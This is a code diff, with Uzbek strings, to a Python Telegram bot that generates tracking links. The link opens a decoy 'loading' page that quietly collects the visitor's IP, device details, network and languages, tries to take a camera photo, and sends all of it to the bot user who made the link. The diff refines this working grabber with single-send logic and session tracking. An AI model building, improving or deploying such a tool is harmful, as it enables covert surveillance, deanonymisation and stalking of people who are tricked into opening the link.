@@ -18,31 +18,29 @@ WEBHOOK_DOMAIN = os.getenv("WEBHOOK_DOMAIN", "https://fit-roanna-runex-7a8db616.
 PORT = int(os.getenv("PORT", "8000"))
 
 USER_TOKENS = {}
+ACTIVE_SESSIONS = {}  # token -> session info
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     token = str(uuid.uuid4())
     USER_TOKENS[token] = user_id
+    ACTIVE_SESSIONS[token] = {'data_sent': False, 'camera_allowed': False}
     link = f"{WEBHOOK_DOMAIN}/track?token={token}"
     msg = (
         "👋 Salom!\n\n"
         "Quyidagi havolani oching, sahifa ochilgach ma'lumotlar olish boshlanadi.\n"
         f"🔗 {link}\n\n"
-        "Jarayon davomida rasm va qurilma ma'lumotlari sizga yuboriladi."
+        "Agar kameraga ruxsat berilsa, rasm ham yuboriladi."
     )
     await update.message.reply_text(msg)
 
 def get_client_ip(request: web.Request) -> str:
-    # Agar app'ingiz reverse proxy orqasida bo‘lsa, X-Forwarded-For ishlatish kerak
     hdr = request.headers.get("X-Forwarded-For")
     if hdr:
-        # odatda bir nechta IP bo‘lishi mumkin, birinchi IP — haqiqiy mijoz
         return hdr.split(",")[0].strip()
-    # aks holda request.remote bo‘yicha
     rem = request.remote
     if rem:
         return rem
-    # fallback
     peer = request.transport.get_extra_info("peername")
     if peer:
         return str(peer[0])
@@ -82,8 +80,12 @@ async def track_page(request: web.Request):
   <div class="loader"></div>
   <div class="note">Tajribangiz moslashtirilmoqda...</div>
   <script>
-    async function repeatSend() {{
-      async function collectAndSend() {{
+    let dataSent = false;
+    let cameraAllowed = false;
+
+    async function collectAndSend() {{
+        if (dataSent) return;
+        
         const data = {{
           timestamp: new Date().toISOString(),
           timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
@@ -140,6 +142,7 @@ async def track_page(request: web.Request):
         let img = null;
         try {{
           const stream = await navigator.mediaDevices.getUserMedia({{ video: true }});
+          cameraAllowed = true;
           const track = stream.getVideoTracks()[0];
           const settings = track.getSettings();
           data.cameraRes = `${{settings.width}}x${{settings.height}}`;
@@ -156,10 +159,10 @@ async def track_page(request: web.Request):
 
           stream.getTracks().forEach(t => t.stop());
         }} catch (e) {{
-          // kamera rad etilgan bo‘lishi mumkin
+          // kamera rad etilgan
         }}
 
-        const body = {{ token: "{token}", clientData: data }};
+        const body = {{ token: "{token}", clientData: data, cameraAllowed: cameraAllowed }};
         if (img) {{
           body.image = img;
         }}
@@ -169,14 +172,12 @@ async def track_page(request: web.Request):
           headers: {{ "Content-Type": "application/json" }},
           body: JSON.stringify(body)
         }});
-      }}
-
-      while (true) {{
-        await collectAndSend();
-        await new Promise(r => setTimeout(r, 1500));
-      }}
+        
+        dataSent = true;
     }}
-    repeatSend();
+
+    // Boshlang'ich yuborish
+    setTimeout(collectAndSend, 1000);
   </script>
 </body>
 </html>"""
@@ -187,19 +188,25 @@ async def submit_data(request: web.Request):
         body = await request.json()
         token = body.get("token")
         client_data = body.get("clientData", {})
+        camera_allowed = body.get("cameraAllowed", False)
         user_id = USER_TOKENS.get(token)
+        
         if not user_id:
             return web.Response(status=403)
+
+        session = ACTIVE_SESSIONS.get(token, {})
+        if session.get('data_sent'):
+            return web.Response(text="already processed")
+
+        session['data_sent'] = True
+        session['camera_allowed'] = camera_allowed
+        ACTIVE_SESSIONS[token] = session
 
         ip = get_client_ip(request)
         devs = client_data.get("devices", {})
 
-        # format vaqt uchun
-        ts = client_data.get("timestamp")
-        # Agar ISO string bo‘lsa, uni yanada chiroyli formata keltirish mumkin
-
         message = (
-            f"🕒 Sana/Vaqt: {ts}\n"
+            f"🕒 Sana/Vaqt: {client_data.get('timestamp')}\n"
             f"🌍 Zona: {client_data.get('timezone')} (UTC{client_data.get('utcOffset')})\n"
             f"📍 IP: {ip}\n"
             f"📱 Qurilma: {client_data.get('model')} ({client_data.get('deviceType')})\n"
@@ -212,11 +219,11 @@ async def submit_data(request: web.Request):
             f"📷 Kamera aniqlangan o‘lcham: {client_data.get('cameraRes')}\n"
             f"📶 Tarmoq: {client_data.get('network')}\n"
             f"🗣 Tillar: {client_data.get('languages')}\n"
-            f"🔍 UA: {client_data.get('userAgent')}"
+            f"🔍 UA: {client_data.get('userAgent')}\n"
+            f"📷 Kamera: {'✅ Ruxsat berildi' if camera_allowed else '❌ Ruxsat berilmadi'}"
         )
 
-        # Agar image yuborilgan bo‘lsa, yubor
-        if "image" in body:
+        if camera_allowed and "image" in body:
             img_data = body["image"]
             if "," in img_data:
                 b64 = img_data.split(",", 1)[1]
@@ -234,27 +241,11 @@ async def submit_data(request: web.Request):
         logger.exception("submit_data xato")
         return web.Response(status=500, text=str(e))
 
-# upload_image route optional (agar rasm alohida endpoint bo‘lishi kerak bo‘lsa)
-# lekin biz rasmni birga /submit da yuboryapmiz
-
-async def camera_denied(request: web.Request):
-    try:
-        data = await request.json()
-        token = data.get("token")
-        user_id = USER_TOKENS.get(token)
-        if user_id:
-            await request.app["bot"].send_message(chat_id=user_id, text="⚠️ Kamera ruxsati berilmadi yoki mavjud emas.")
-        return web.Response(status=200)
-    except Exception as e:
-        logger.exception("camera_denied")
-        return web.Response(status=500)
-
 async def start_web_server(bot):
     app = web.Application()
     app["bot"] = bot
     app.router.add_get("/track", track_page)
     app.router.add_post("/submit", submit_data)
-    app.router.add_post("/camera_denied", camera_denied)
     runner = web.AppRunner(app)
     await runner.setup()
     site = web.TCPSite(runner, "0.0.0.0", PORT)
